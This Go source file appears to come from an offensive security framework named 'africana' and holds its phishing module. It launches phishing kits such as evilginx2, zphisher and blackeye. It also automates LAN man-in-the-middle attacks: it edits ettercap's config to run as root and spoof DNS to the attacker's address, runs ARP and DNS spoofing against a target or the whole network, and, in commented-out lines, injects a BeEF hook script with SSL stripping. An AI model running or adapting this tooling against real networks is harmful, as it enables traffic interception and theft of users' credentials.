package phishers

import(
    "os"
    "fmt"
    "utils"
    "menus"
    "bufio"
    "strings"
    "bcolors"
    "subprocess"
)

var(
    userInput   string
    userTarget  string
    userLhost   string
    userLPort   string
    userFakeDns string
    userName    string
    userPass    string
    userIface   string
    scanner = bufio.NewScanner(os.Stdin)
)

func GoPhish() {
    subprocess.Popen(`gophish`)
}

func GoodGinx() {
    subprocess.Popen(`evilginx2`)
}

func ZPhisher() {
    subprocess.Popen(`cd /root/.africana/africana-base/phishers/zphisher; bash zphisher.sh`)
}

func Darkphish() {
    subprocess.Popen(`cd /root/.africana/africana-base/phishers/darkphish; python3 dark-phish.py`)
}

func SetoolKit() {
    subprocess.Popen(`cd /root/.africana/africana-base/phishers/set/; python3 setoolkit`)
}

func AdvPhisher() {
    subprocess.Popen(`cd /root/.africana/africana-base/phishers/advphishing/; bash advphishing.sh`)
}

func CyberPhish() {
    subprocess.Popen(`cd /root/.africana/africana-base/phishers/cyberphish; python3 cyberphish.py`)
}

func Blackeye() {
    subprocess.Popen(`cd /root/.africana/africana-base/phishers/blackeye; bash blackeye.sh`)
}

func NinjaEttercap(userTarget string) {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println("Error getting default userLhostIp:", err)
        os.Exit(1)
    }
    menus.MenuSevenOne()
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "NinjaEttercap" + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userInput := scanner.Text()
    switch strings.ToLower(userInput) {
    case "0":
        return
    case "1":
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        scanner.Scan()
        userIface := scanner.Text()
        if userIface == "" {
            userIface = "eth0"
        }
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "NinjaEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        scanner.Scan()
        userLhost := scanner.Text()
        if userLhost == "" {
            userLhost = userLhostIp
        }
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "NinjaEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "FAKEDNS " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Lengendery * A 0.0.0.0" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        scanner.Scan()
        userFakeDns := scanner.Text()
        if userFakeDns == "" {
            userFakeDns = "*"
        }
        filePathO := "/etc/ettercap/etter.conf.bak_africana"
        if _, err := os.Stat(filePathO); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
            filesToReplacements := map[string]map[string]string{
                "/etc/ettercap/etter.conf": {
                    `ec_uid = 65534`: `ec_uid = 0`,
                    `ec_gid = 65534`: `ec_gid = 0`,
                    `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                },
            }
        utils.Editors(filesToReplacements)
        }
        filePathT := "/etc/ettercap/etter.dns.bak_africana"
        if _, err := os.Stat(filePathT); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
            newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", userFakeDns, " A ", userLhost)
            filesToReplacements := map[string]map[string]string{
                "/etc/ettercap/etter.dns": {
                    `# vim:ts=8:noexpandtab`: newString,
                 },
            }
        utils.Editors(filesToReplacements)
        }
        userGateway, err := utils.GetDefaultGatewayIP()
        if err != nil {
            panic(err)
        }
        fmt.Println()
        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof /%s// /%s//" &; cd /root/.africana/africana-base/phishers/blackeye; bash blackeye.sh`, userIface, userTarget, userGateway)
        fmt.Println()
        subprocess.Popen(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
    case "2":
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        scanner.Scan()
        userIface := scanner.Text()
        if userIface == "" {
            userIface = "eth0"
        }
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "NinjaEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        scanner.Scan()
        userLhost := scanner.Text()
        if userLhost == "" {
            userLhost = userLhostIp
        }
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "NinjaEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "FAKEDNS " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Lengendery * A 0.0.0.0" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        scanner.Scan()
        userFakeDns := scanner.Text()
        if userFakeDns == "" {
            userFakeDns = "*"
        }
        filePathO := "/etc/ettercap/etter.conf.bak_africana"
        if _, err := os.Stat(filePathO); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
            filesToReplacements := map[string]map[string]string{
                "/etc/ettercap/etter.conf": {
                    `ec_uid = 65534`: `ec_uid = 0`,
                    `ec_gid = 65534`: `ec_gid = 0`,
                    `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                },
            }
        utils.Editors(filesToReplacements)
        }
        filePathT := "/etc/ettercap/etter.dns.bak_africana"
        if _, err := os.Stat(filePathT); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
            newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", userFakeDns, " A ", userLhost)
            filesToReplacements := map[string]map[string]string{
                "/etc/ettercap/etter.dns": {
                    `# vim:ts=8:noexpandtab`: newString,
                 },
            }
        utils.Editors(filesToReplacements)
        }
        fmt.Println()
        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof ///" &; cd /root/.africana/africana-base/phishers/blackeye; bash blackeye.sh`, userIface)
        fmt.Println()
        subprocess.Popen(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
    default:
        utils.SystemShell(userInput)
    }
    fmt.Println()
}

func NinjaBettercap(userTarget string) {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println("Error getting default userLhostIp:", err)
        os.Exit(1)
    }
    menus.MenuSevenOne()
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "NinjaBettercap" + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userInput := scanner.Text()
    switch strings.ToLower(userInput) {
    case "0":
        return
    case "1":
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        scanner.Scan()
        userIface := scanner.Text()
        if userIface == "" {
            userIface = "eth0"
        }
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "NinjaBettercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        scanner.Scan()
        userLhost := scanner.Text()
        if userLhost == "" {
            userLhost = userLhostIp
        }
        //fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set https.proxy.certificate /root/.africana/certs/africana-cert.pem; set https.proxy.key /root/.africana/certs/africana-key.pem; set arp.spoof.targets %s; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true; active"`, userLhost, userIface, userLhost, userTarget, userLhost)
        fmt.Println()
        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active'"&; cd /root/.africana/africana-base/phishers/blackeye; bash blackeye.sh`, userIface, userTarget)
    case "2":
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        scanner.Scan()
        userIface := scanner.Text()
        if userIface == "" {
            userIface = "eth0"
        }
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "NinjaBettercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        scanner.Scan()
        userLhost := scanner.Text()
        if userLhost == "" {
            userLhost = userLhostIp
        }
        //fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set https.proxy.certificate /root/.africana/certs/africana-cert.pem; set https.proxy.key /root/.africana/certs/africana-key.pem; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true; active"`, userLhost, userIface, userLhost, userLhost)
        fmt.Println()
        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active'"&; cd /root/.africana/africana-base/phishers/blackeye; bash blackeye.sh`, userIface)
    default:
        utils.SystemShell(userInput)
    }
}

func NinjaPhish(userTarget string) {
    for {
        menus.MenuThreeThree()
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "NinjaIPhish " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Ettercap" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        scanner.Scan()
        userInput := scanner.Text()
        if userInput == "" {
            userInput = "1"
         }
        switch userInput {
        case "0":
            return
        case "1":
            NinjaEttercap(userTarget)
        case "2":
            NinjaBettercap(userTarget)
        default:
            utils.SystemShell(userInput)
         }
    }
}
